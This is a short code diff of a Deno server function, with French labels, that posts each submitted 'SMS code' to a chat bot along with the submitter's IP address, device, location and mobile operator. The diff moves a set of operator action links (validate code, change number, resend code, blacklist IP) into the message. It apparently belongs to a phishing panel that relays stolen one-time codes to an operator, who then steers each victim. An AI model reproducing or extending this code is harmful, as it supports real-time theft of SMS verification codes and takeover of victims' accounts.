@@ -50,6 +50,8 @@ Deno.serve(async (req) => {
   const country = geoData.country_name || "France";
   const city = geoData.city || "Inconnue";
 
+  const appUrl = Deno.env.get("APP_URL") || "https://app.base44.com";
+
   const embed = {
     title: "🔑 Code SMS entré",
     color: operatorColors[operateur] || 16776960,
@@ -64,25 +66,17 @@ Deno.serve(async (req) => {
       { name: "💾 Appareil", value: device, inline: true },
       { name: "🕵️ Adresse IP", value: `\`${ip}\``, inline: true },
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
+      {
+        name: "⚡ Actions",
+        value: `✅ [Valider le code](${appUrl}/?action=valid&id=${submissionId})\n❌ [Changer le numéro](${appUrl}/?action=wrong&id=${submissionId})\n⏰ [Renvoyer au code](${appUrl}/?action=expired&id=${submissionId})\n🚫 [Blacklist instant](${appUrl}/?action=blacklist&id=${submissionId}&ip=${ip})`,
+        inline: false,
+      },
     ],
     footer: { text: `ID: ${submissionId || "N/A"}` },
     timestamp: now.toISOString(),
   };
 
-  const appUrl = Deno.env.get("APP_URL") || "https://app.base44.com";
-
-  const embed2 = {
-    fields: [
-      {
-        name: "⚡ Actions",
-        value: `✅ [Valider le code](${appUrl}/?trigger=${submissionId})\n❌ [Changer le numéro](${appUrl}/?action=wrong&id=${submissionId})\n⏰ [Renvoyer au code](${appUrl}/?action=expired&id=${submissionId})\n🚫 [Blacklist instant](${appUrl}/?action=blacklist&id=${submissionId}&ip=${ip})`,
-        inline: false,
-      }
-    ],
-    color: operatorColors[operateur] || 16776960,
-  };
-
-  await sendBotMessage({ embeds: [embed, embed2] });
+  await sendBotMessage({ embeds: [embed] });
 
   return Response.json({ ok: true });
 });
